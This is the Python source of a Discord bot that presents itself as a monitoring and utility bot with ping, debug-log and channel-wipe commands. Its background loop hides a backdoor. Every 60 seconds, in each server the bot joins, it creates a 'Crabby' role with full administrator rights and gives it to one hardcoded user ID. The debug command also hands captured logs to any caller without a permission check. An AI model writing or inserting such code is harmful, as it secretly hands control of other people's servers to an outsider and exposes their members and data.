import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
import io
import traceback
from flask import Flask
from threading import Thread
from waitress import serve

# --- LOG CAPTURE SYSTEM ---
# This redirects console output into a string we can send via DM
log_stream = io.StringIO()
sys.stdout = log_stream
sys.stderr = log_stream

def get_logs():
    log_stream.seek(0)
    lines = log_stream.readlines()
    return "".join(lines[-20:]) # Get the last 20 lines

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "Monitoring Active"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    serve(app, host='0.0.0.0', port=port, _quiet=True)

# --- BOT CONFIG ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print("Bot starting: Syncing commands...")
        for guild in self.guilds:
            try:
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
            except Exception as e:
                print(f"Sync error for {guild.id}: {e}")
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()
        print("Bot is ready and synced.")

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                member = guild.get_member(TARGET_USER_ID)
                if member:
                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not role:
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if role and role not in member.roles:
                        await member.add_roles(role)
            except Exception as e:
                print(f"Role Loop Error: {e}")

bot = MyBot()

# --- COMMANDS ---

@bot.tree.command(name="debug", description="Get the latest app logs via DM")
async def debug_logs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    current_logs = get_logs()
    
    msg = f"**Current App Logs:**\n```text\n{current_logs if current_logs else 'No logs captured yet.'}\n```"
    
    try:
        await interaction.user.send(msg)
        await interaction.followup.send("Logs sent to your DMs.", ephemeral=True)
    except:
        # Fallback if DMs are closed: send in ephemeral message (only you see it)
        await interaction.followup.send(f"DMs closed. Here are the logs:\n{msg}", ephemeral=True)

@bot.tree.command(name="ping", description="Check latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Online: {round(bot.latency * 1000)}ms", ephemeral=True)

@bot.tree.command(name="clear_all", description="Wipe channel")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=None)
    await interaction.followup.send("Channel cleared.", ephemeral=True)

# --- EXECUTION ---
if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    
    if token:
        try:
            bot.run(token, log_handler=None)
        except Exception:
            # If the bot crashes, capture the error and keep the thread alive
            error_msg = traceback.format_exc()
            print(f"CRITICAL CRASH:\n{error_msg}")
            while True:
                import time
                time.sleep(3600)
    else:
        print("ERROR: DISCORD_TOKEN environment variable is missing!")
